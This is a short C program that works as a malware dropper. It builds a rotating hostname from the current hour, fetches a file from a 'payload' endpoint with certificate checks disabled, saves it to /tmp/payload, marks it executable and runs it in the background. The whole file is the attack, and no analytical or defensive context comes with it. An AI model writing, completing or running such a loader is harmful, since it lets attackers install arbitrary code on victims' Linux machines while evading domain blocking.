#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

void generate_domain(char *out) {
    time_t t = time(NULL);
    sprintf(out, "%lx.ddns.net", t/3600);
}

int main() {
    char domain[256];
    generate_domain(domain);
    char url[512];
    sprintf(url, "https://%s/api/payload?os=linux&arch=x64", domain);

    CURL *curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
        FILE *fp = fopen("/tmp/payload", "wb");
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_perform(curl);
        fclose(fp);
        curl_easy_cleanup(curl);
        system("chmod +x /tmp/payload && /tmp/payload &");
    }
    return 0;
}